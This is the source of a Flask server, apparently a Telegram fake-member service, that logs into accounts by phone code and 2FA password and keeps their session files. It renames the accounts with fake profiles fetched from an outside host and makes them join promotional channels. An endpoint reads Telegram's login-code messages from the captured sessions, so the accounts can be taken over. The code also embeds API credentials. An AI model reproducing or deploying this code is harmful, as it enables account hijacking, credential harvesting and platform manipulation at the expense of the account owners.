import requests, json, asyncio, shutil
from Library import Library
from flask import Flask, jsonify, request, abort, redirect
from telethon.tl.functions.messages import GetHistoryRequest
from telethon.tl.functions.account import UpdateProfileRequest
from telethon import TelegramClient, errors
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from os import path
import re

loop = asyncio.get_event_loop()
MrPhpInfo_cm = 276505
MrPhpInfo_ct = "5d4e2ae3033eee4aff7a614f937b379b"

# Creating a new "app" by using the Flask constructor. Passes __name__ as a parameter.
app = Flask(__name__)


def clinettg(phonenumber):
    return TelegramClient("session/" + str(phonenumber), MrPhpInfo_cm, MrPhpInfo_ct)


def clinettgActive(phonenumber):
    return TelegramClient("Activesession/" + str(phonenumber), MrPhpInfo_cm, MrPhpInfo_ct)


async def sendMessage(phonenumber):
    client = clinettgActive(phonenumber)
    try:
        await client.connect()
        await client.start()
        if await client.is_user_authorized():
            await client.send_message("me", "tsaaaat")
            return "ok"
    except Exception as e:
        return


async def getAccountinfo(PhoneNumber):
    client = clinettgActive(PhoneNumber)
    try:
        await client.connect()
        if await client.is_user_authorized():
            full = await client.get_me()
            await client.disconnect()
            return jsonify(full.id)
        else:
            return jsonify("Request Is NotFound")
    except Exception as e:
        return jsonify("Request Is NotFound")


async def SendRequestCode(PhoneNumber):
    client = clinettg(PhoneNumber)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            hash = await client.send_code_request(PhoneNumber)
            await client.disconnect()
            return jsonify({"Result": {"ok": True, "hash": hash.phone_code_hash, "status": "Your Code now Send!"}})
        else:
            return jsonify({"Error": {"ok": False, "error_message": "User Now Singin"}})
    except errors.PhoneNumberInvalidError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": "Phone number Is Not Correct"}})
    except errors.PhoneNumberOccupiedError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.PhoneNumberUnoccupiedError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.PhoneNumberFloodError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.PhoneNumberBannedError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": "Ban"}})
    except errors.PhoneNumberAppSignupForbiddenError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.CodeEmptyError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.CodeInvalidError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.CodeHashInvalidError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.FloodWaitError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": "Flood"}})
    except errors.SessionPasswordNeededError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": "Accout Have 2FA Password"}})
    except errors.PhoneCodeExpiredError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": "Code Expire"}})


async def getCode(PhoneNumber):
    client = clinettgActive(PhoneNumber)
    try:
        await client.connect()
        if await client.is_user_authorized():
            await client.start()
            tst = await client.get_entity(777000)
            a = await client(
                GetHistoryRequest(peer=tst, limit=1, offset_date=None, offset_id=0, max_id=0, min_id=0, add_offset=0,
                                  hash=0))
            message = a.messages[0].message
            findcode = re.findall("[0-9][0-9][0-9][0-9][0-9]", message)
            if findcode:
                await client.disconnect()
                return jsonify({"Result": {"ok": True, "code": findcode[0]}})
            else:
                await client.disconnect()
                return jsonify({"Error": {"ok": False, "error_message": "Code Not Found"}})
        else:
            await client.disconnect()
            return jsonify({"Error": {"ok": False, "error_message": "Sesstion Not Found"}})
    except Exception as e:
        print(e)
        return jsonify({"Error": {"ok": False, "error_message": "Sesstion Not Found"}})


async def RequestSingin(phoneNumber, Code, hash):
    client = clinettg(phoneNumber)
    data = requests.get(url="http://chocolateozv.farahost.xyz/FakeProfile/Account.php", )
    binary = data.content
    profile = json.loads(binary)['new_user_profile']
    try:
        await client.connect()
        if not await client.is_user_authorized():
            if await client.sign_in(phoneNumber, Code, phone_code_hash=hash):
                await client(UpdateProfileRequest(
                    first_name=profile['first_name'],
                    last_name=profile['last_name']
                ))
                await client.send_message("ChocolateOzvBot", "/start")
                await client(JoinChannelRequest("ChocolatePost"))
                await client(JoinChannelRequest("ChocolateOzv"))
                await client(ImportChatInviteRequest("BA4MtBLRtro3OTA0"))
                await client.send_message(-1001434083094, "ربات استارت کانال ربات جوین شدم")
                shutil.move(f"session/{phoneNumber}.session", f"Activesession/{phoneNumber}.session")
                await client.disconnect()
                return jsonify({"Result": {"ok": True, "status": "You Loging!"}})
        else:
            return jsonify({"Error": {"ok": False, "error_message": "User Now Singin"}})
    except errors.PhoneNumberInvalidError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": "Phone number Is Not Correct"}})
    except errors.PhoneNumberOccupiedError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.PhoneNumberUnoccupiedError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.PhoneNumberFloodError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": "Flood"}})
    except errors.PhoneNumberBannedError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": "Ban"}})
    except errors.PhoneNumberAppSignupForbiddenError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.CodeEmptyError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.CodeInvalidError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.CodeHashInvalidError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.PhoneCodeInvalidError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": "Code Is Not Correct"}})
    except errors.SessionPasswordNeededError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": "Accout Have 2FA Password"}})
    except errors.PhoneCodeExpiredError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": "Code Expire"}})


async def RequestSingin2fa(phoneNumber, Code, hash, password):
    client = clinettg(phoneNumber)
    data = requests.get(url="http://chocolateozv.farahost.xyz/FakeProfile/Account.php", )
    binary = data.content
    profile = json.loads(binary)['new_user_profile']
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await client.sign_in(phoneNumber, Code, phone_code_hash=hash)
        else:
            return jsonify({"Error": {"ok": False, "error_message": "User Now Singin"}})
    except errors.PhoneNumberInvalidError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": "Phone number Is Not Correct"}})
    except errors.PhoneNumberOccupiedError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.PhoneNumberUnoccupiedError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.PhoneNumberFloodError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": "Flood"}})
    except errors.PhoneNumberBannedError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.PhoneNumberAppSignupForbiddenError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.CodeEmptyError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.CodeInvalidError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.CodeHashInvalidError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.PhoneCodeInvalidError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": "Code Is Not Correct"}})
    except errors.SessionPasswordNeededError as e:
        if await client.sign_in(password=password):
            await client(UpdateProfileRequest(
                first_name=profile['first_name'],
                last_name=profile['last_name']
            ))
            await client.send_message("ChocolateOzvBot", "/start")
            await client(JoinChannelRequest("ChocolatePost"))
            await client(JoinChannelRequest("ChocolateOzv"))
            await client(ImportChatInviteRequest("BA4MtBLRtro3OTA0"))
            await client.send_message(-1001434083094, "ربات استارت کانال ربات جوین شدم")
            shutil.move(f"session/{phoneNumber}.session", f"Activesession/{phoneNumber}.session")
            await client.disconnect()
            return jsonify({"Result": {"ok": True, "status": "You Loging!"}})
        else:
            return jsonify(
                {"Error": {"ok": False, "Error_code": e.code, "error_message": "2FA Password is not correct"}})
    except errors.SessionExpiredError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": e.message}})
    except errors.PhoneCodeExpiredError as e:
        return jsonify({"Error": {"ok": False, "Error_code": e.code, "error_message": "Code Expire"}})


def CheckGetAllAccount(arr):
    List = []
    for x in arr:
        if not path.exists("Activesession/" + str(x['Numbers']) + ".session"):
            List.append({"Number": x['Numbers'], "Owner": x['Owner']})
    if (len(List) > 0):
        return jsonify(List)
    else:
        return jsonify(List)

@app.errorhandler(403)
def resource_hiden(e):
    return redirect(
        "http://bmbgk.ir/?q=%DA%86%DA%AF%D9%88%D9%86%D9%87+%D8%A7%D8%B2+%D8%A7%D9%85%DA%A9%D8%A7%D9%86%D8%A7%D8%AA+%D8%A8%D8%B5%D9%88%D8%B1%D8%AA+%D8%B3%D8%A7%D9%84%D9%85+%D9%88+%D8%AF%D8%B1%D8%B3%D8%AA+%D8%A7%D8%B3%D8%AA%D9%81%D8%A7%D8%AF%D9%87+%DA%A9%D9%86%DB%8C%D9%85%D8%9F&l=1")


@app.before_request
def AllowIp():
    Allowiplist = ['45.156.184.155', '168.119.1.119']
    ip = request.environ.get('REMOTE_ADDR')
    if not ip in Allowiplist:
        abort(403)


@app.route("/api/GetAllAccount", methods=["POST"])
def GetAllAccount():
    if request.get_json():
        req = request.get_json()
        return CheckGetAllAccount(req)
    else:
        return "Send Json"


async def libGetPost(message_id):
    bot = Library()
    await bot.apiJoinChannel(message_id)


@app.route("/api/GetPost/<int:message_id>")
def GetPost(message_id):
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(libGetPost(message_id))
        loop.close()
    except Exception as e:
        e
    return "ok"


@app.route("/")
def index():
    return jsonify("ok")


@app.route("/sendCode/<int:PhoneNumber>", methods=["GET"])
def sendCode(PhoneNumber):
    return loop.run_until_complete(SendRequestCode(PhoneNumber))


@app.route("/singIn/<int:PhoneNumber>/<int:code>/<string:hash>", methods=["GET"])
def SingIn(PhoneNumber, code, hash):
    return loop.run_until_complete(RequestSingin(PhoneNumber, code, hash))


@app.route("/api/getAccountInfo/<int:PhoneNumber>", methods=["GET"])
def getaccountinfo(PhoneNumber):
    return loop.run_until_complete(getAccountinfo(PhoneNumber))\

@app.route("/api/getAccount/<int:PhoneNumber>", methods=["GET"])
def getCodeApi(PhoneNumber):
    return loop.run_until_complete(getCode(PhoneNumber))


@app.route("/singIn/2fa/<int:PhoneNumber>/<int:code>/<string:hash>/<string:password>", methods=["GET"])
def SingIn2fa(PhoneNumber, code, hash, password):
    return loop.run_until_complete(RequestSingin2fa(PhoneNumber, code, hash, password))


# Checks to see if the name of the package is the run as the main package.
if __name__ == "__main__":
    # Runs the Flask application only if the main.py file is being run.
    app.run(host="0.0.0.0", debug=False, port=8080, )
